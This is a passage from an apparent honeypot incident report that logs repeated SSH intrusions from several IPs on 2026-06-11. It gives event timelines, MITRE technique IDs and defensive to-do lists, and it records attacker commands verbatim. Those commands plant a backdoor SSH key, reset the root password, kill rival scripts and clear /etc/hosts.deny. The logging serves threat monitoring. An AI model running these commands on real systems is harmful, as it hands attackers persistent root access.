| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:EwJnm4FH8Wzn"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:37:53` | `cowrie.session.connect` |
| `2026-06-11 14:37:53` | `cowrie.client.version` |
| `2026-06-11 14:37:54` | `cowrie.client.kex` |
| `2026-06-11 14:37:54` | `cowrie.login.success` |
| `2026-06-11 14:37:55` | `cowrie.session.params` |
| `2026-06-11 14:37:55` | `cowrie.command.input` |
| `2026-06-11 14:37:55` | `cowrie.command.failed` |
| `2026-06-11 14:37:56` | `cowrie.log.closed` |
| `2026-06-11 14:37:56` | `cowrie.session.params` |
| `2026-06-11 14:37:56` | `cowrie.command.input` |
| `2026-06-11 14:37:56` | `cowrie.session.file_download` |
| `2026-06-11 14:37:56` | `cowrie.log.closed` |
| `2026-06-11 14:38:13` | `cowrie.session.params` |
| `2026-06-11 14:38:13` | `cowrie.command.input` |
| `2026-06-11 14:38:13` | `cowrie.log.closed` |
| `2026-06-11 14:38:13` | `cowrie.session.params` |
| `2026-06-11 14:38:13` | `cowrie.command.input` |
| `2026-06-11 14:38:13` | `cowrie.log.closed` |
| `2026-06-11 14:38:14` | `cowrie.session.params` |
| `2026-06-11 14:38:14` | `cowrie.command.input` |
| `2026-06-11 14:38:14` | `cowrie.session.file_download` |
| `2026-06-11 14:38:14` | `cowrie.log.closed` |
| `2026-06-11 14:38:14` | `cowrie.session.params` |
| `2026-06-11 14:38:14` | `cowrie.command.input` |
| `2026-06-11 14:38:15` | `cowrie.log.closed` |
| `2026-06-11 14:38:15` | `cowrie.session.params` |
| `2026-06-11 14:38:15` | `cowrie.command.input` |
| `2026-06-11 14:38:15` | `cowrie.log.closed` |
| `2026-06-11 14:38:15` | `cowrie.session.params` |
| `2026-06-11 14:38:15` | `cowrie.command.input` |
| `2026-06-11 14:38:15` | `cowrie.command.input` |
| `2026-06-11 14:38:16` | `cowrie.log.closed` |
| `2026-06-11 14:38:16` | `cowrie.session.params` |
| `2026-06-11 14:38:16` | `cowrie.command.input` |
| `2026-06-11 14:38:17` | `cowrie.log.closed` |
| `2026-06-11 14:38:17` | `cowrie.session.params` |
| `2026-06-11 14:38:17` | `cowrie.command.input` |
| `2026-06-11 14:38:18` | `cowrie.log.closed` |
| `2026-06-11 14:38:18` | `cowrie.session.params` |
| `2026-06-11 14:38:18` | `cowrie.command.input` |
| `2026-06-11 14:38:18` | `cowrie.log.closed` |
| `2026-06-11 14:38:19` | `cowrie.session.params` |
| `2026-06-11 14:38:19` | `cowrie.command.input` |
| `2026-06-11 14:38:19` | `cowrie.log.closed` |
| `2026-06-11 14:38:19` | `cowrie.session.params` |
| `2026-06-11 14:38:19` | `cowrie.command.input` |
| `2026-06-11 14:38:20` | `cowrie.log.closed` |
| `2026-06-11 14:38:20` | `cowrie.session.params` |
| `2026-06-11 14:38:20` | `cowrie.command.input` |
| `2026-06-11 14:38:21` | `cowrie.log.closed` |
| `2026-06-11 14:38:21` | `cowrie.session.params` |
| `2026-06-11 14:38:21` | `cowrie.command.input` |
| `2026-06-11 14:38:21` | `cowrie.log.closed` |
| `2026-06-11 14:38:22` | `cowrie.session.params` |
| `2026-06-11 14:38:22` | `cowrie.command.input` |
| `2026-06-11 14:38:22` | `cowrie.log.closed` |
| `2026-06-11 14:38:22` | `cowrie.session.params` |
| `2026-06-11 14:38:22` | `cowrie.command.input` |
| `2026-06-11 14:38:22` | `cowrie.log.closed` |
| `2026-06-11 14:38:22` | `cowrie.session.params` |
| `2026-06-11 14:38:22` | `cowrie.command.input` |
| `2026-06-11 14:38:23` | `cowrie.log.closed` |
| `2026-06-11 14:38:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]208` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad5f79fbe85b

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-06-11 14:38 |
| **Last Seen** | 2026-06-11 14:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:38:05` | `cowrie.session.connect` |
| `2026-06-11 14:38:05` | `cowrie.client.version` |
| `2026-06-11 14:38:05` | `cowrie.client.kex` |
| `2026-06-11 14:38:05` | `cowrie.login.success` |
| `2026-06-11 14:38:06` | `cowrie.session.params` |
| `2026-06-11 14:38:06` | `cowrie.command.input` |
| `2026-06-11 14:38:06` | `cowrie.command.failed` |
| `2026-06-11 14:38:06` | `cowrie.log.closed` |
| `2026-06-11 14:38:06` | `cowrie.session.params` |
| `2026-06-11 14:38:06` | `cowrie.command.input` |
| `2026-06-11 14:38:06` | `cowrie.session.file_download` |
| `2026-06-11 14:38:06` | `cowrie.log.closed` |
| `2026-06-11 14:38:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23f1aa49b2e1

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-06-11 14:38 |
| **Last Seen** | 2026-06-11 14:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:38:08` | `cowrie.session.connect` |
| `2026-06-11 14:38:08` | `cowrie.client.version` |
| `2026-06-11 14:38:09` | `cowrie.client.kex` |
| `2026-06-11 14:38:09` | `cowrie.login.success` |
| `2026-06-11 14:38:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e095fa0899a

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-06-11 14:40 |
| **Last Seen** | 2026-06-11 14:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:40:00` | `cowrie.session.connect` |
| `2026-06-11 14:40:00` | `cowrie.client.version` |
| `2026-06-11 14:40:00` | `cowrie.client.kex` |
| `2026-06-11 14:40:01` | `cowrie.login.success` |
| `2026-06-11 14:40:01` | `cowrie.session.params` |
| `2026-06-11 14:40:01` | `cowrie.command.input` |
| `2026-06-11 14:40:01` | `cowrie.command.failed` |
| `2026-06-11 14:40:01` | `cowrie.log.closed` |
| `2026-06-11 14:40:02` | `cowrie.session.params` |
| `2026-06-11 14:40:02` | `cowrie.command.input` |
| `2026-06-11 14:40:02` | `cowrie.session.file_download` |
| `2026-06-11 14:40:02` | `cowrie.log.closed` |
| `2026-06-11 14:40:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f7b6c33a149

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-06-11 14:40 |
| **Last Seen** | 2026-06-11 14:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:40:04` | `cowrie.session.connect` |
| `2026-06-11 14:40:04` | `cowrie.client.version` |
| `2026-06-11 14:40:04` | `cowrie.client.kex` |
| `2026-06-11 14:40:05` | `cowrie.login.success` |
| `2026-06-11 14:40:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3c875a7c2a1

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-06-11 14:43 |
| **Last Seen** | 2026-06-11 14:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:43:32` | `cowrie.session.connect` |
| `2026-06-11 14:43:32` | `cowrie.client.version` |
| `2026-06-11 14:43:32` | `cowrie.client.kex` |
| `2026-06-11 14:43:32` | `cowrie.login.success` |
| `2026-06-11 14:43:32` | `cowrie.session.params` |
| `2026-06-11 14:43:32` | `cowrie.command.input` |
| `2026-06-11 14:43:32` | `cowrie.command.failed` |
| `2026-06-11 14:43:33` | `cowrie.log.closed` |
| `2026-06-11 14:43:33` | `cowrie.session.params` |
| `2026-06-11 14:43:33` | `cowrie.command.input` |
| `2026-06-11 14:43:33` | `cowrie.session.file_download` |
| `2026-06-11 14:43:33` | `cowrie.log.closed` |
| `2026-06-11 14:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-126ed45f22b8

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-06-11 14:43 |
| **Last Seen** | 2026-06-11 14:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:43:34` | `cowrie.session.connect` |
| `2026-06-11 14:43:34` | `cowrie.client.version` |
| `2026-06-11 14:43:34` | `cowrie.client.kex` |
| `2026-06-11 14:43:35` | `cowrie.login.success` |
| `2026-06-11 14:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b09609606306

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-06-11 14:43 |
| **Last Seen** | 2026-06-11 14:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:43:54` | `cowrie.session.connect` |
| `2026-06-11 14:43:54` | `cowrie.client.version` |
| `2026-06-11 14:43:55` | `cowrie.client.kex` |
| `2026-06-11 14:43:55` | `cowrie.login.success` |
| `2026-06-11 14:43:55` | `cowrie.session.params` |
| `2026-06-11 14:43:55` | `cowrie.command.input` |
| `2026-06-11 14:43:55` | `cowrie.command.failed` |
| `2026-06-11 14:43:56` | `cowrie.log.closed` |
| `2026-06-11 14:43:56` | `cowrie.session.params` |
| `2026-06-11 14:43:56` | `cowrie.command.input` |
| `2026-06-11 14:43:56` | `cowrie.session.file_download` |
| `2026-06-11 14:43:56` | `cowrie.log.closed` |
| `2026-06-11 14:43:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5caf376001ca

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-06-11 14:43 |
| **Last Seen** | 2026-06-11 14:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:43:58` | `cowrie.session.connect` |
| `2026-06-11 14:43:58` | `cowrie.client.version` |
| `2026-06-11 14:43:58` | `cowrie.client.kex` |
| `2026-06-11 14:43:59` | `cowrie.login.success` |
| `2026-06-11 14:43:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-600f3552ecb7

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-06-11 14:46 |
| **Last Seen** | 2026-06-11 14:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:46:00` | `cowrie.session.connect` |
| `2026-06-11 14:46:00` | `cowrie.client.version` |
| `2026-06-11 14:46:00` | `cowrie.client.kex` |
| `2026-06-11 14:46:00` | `cowrie.login.success` |
| `2026-06-11 14:46:01` | `cowrie.session.params` |
| `2026-06-11 14:46:01` | `cowrie.command.input` |
| `2026-06-11 14:46:01` | `cowrie.command.failed` |
| `2026-06-11 14:46:01` | `cowrie.log.closed` |
| `2026-06-11 14:46:01` | `cowrie.session.params` |
| `2026-06-11 14:46:01` | `cowrie.command.input` |
| `2026-06-11 14:46:02` | `cowrie.session.file_download` |
| `2026-06-11 14:46:02` | `cowrie.log.closed` |
| `2026-06-11 14:46:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1ac30a544a3

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-06-11 14:46 |
| **Last Seen** | 2026-06-11 14:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:46:04` | `cowrie.session.connect` |
| `2026-06-11 14:46:04` | `cowrie.client.version` |
| `2026-06-11 14:46:04` | `cowrie.client.kex` |
| `2026-06-11 14:46:04` | `cowrie.login.success` |
| `2026-06-11 14:46:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc03011b2e2f

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-06-11 14:51 |
| **Last Seen** | 2026-06-11 14:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:51:54` | `cowrie.session.connect` |
| `2026-06-11 14:51:54` | `cowrie.client.version` |
| `2026-06-11 14:51:54` | `cowrie.client.kex` |
| `2026-06-11 14:51:54` | `cowrie.login.success` |
| `2026-06-11 14:51:55` | `cowrie.session.params` |
| `2026-06-11 14:51:55` | `cowrie.command.input` |
| `2026-06-11 14:51:55` | `cowrie.command.failed` |
| `2026-06-11 14:51:55` | `cowrie.log.closed` |
| `2026-06-11 14:51:55` | `cowrie.session.params` |
| `2026-06-11 14:51:55` | `cowrie.command.input` |
| `2026-06-11 14:51:55` | `cowrie.session.file_download` |
| `2026-06-11 14:51:55` | `cowrie.log.closed` |
| `2026-06-11 14:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3507fb481925

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-06-11 14:51 |
| **Last Seen** | 2026-06-11 14:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:51:58` | `cowrie.session.connect` |
| `2026-06-11 14:51:58` | `cowrie.client.version` |
| `2026-06-11 14:51:58` | `cowrie.client.kex` |
| `2026-06-11 14:51:58` | `cowrie.login.success` |
| `2026-06-11 14:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f236b19a04b8

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]208` |
| **First Seen** | 2026-06-11 14:53 |
| **Last Seen** | 2026-06-11 14:53 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:dgbimvuo1et1"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:53:13` | `cowrie.session.connect` |
| `2026-06-11 14:53:13` | `cowrie.client.version` |
| `2026-06-11 14:53:13` | `cowrie.client.kex` |
| `2026-06-11 14:53:14` | `cowrie.login.success` |
| `2026-06-11 14:53:14` | `cowrie.session.params` |
| `2026-06-11 14:53:14` | `cowrie.command.input` |
| `2026-06-11 14:53:14` | `cowrie.command.failed` |
| `2026-06-11 14:53:14` | `cowrie.log.closed` |
| `2026-06-11 14:53:15` | `cowrie.session.params` |
| `2026-06-11 14:53:15` | `cowrie.command.input` |
| `2026-06-11 14:53:15` | `cowrie.session.file_download` |
| `2026-06-11 14:53:15` | `cowrie.log.closed` |
| `2026-06-11 14:53:32` | `cowrie.session.params` |
| `2026-06-11 14:53:32` | `cowrie.command.input` |
| `2026-06-11 14:53:32` | `cowrie.log.closed` |
| `2026-06-11 14:53:32` | `cowrie.session.params` |
| `2026-06-11 14:53:32` | `cowrie.command.input` |
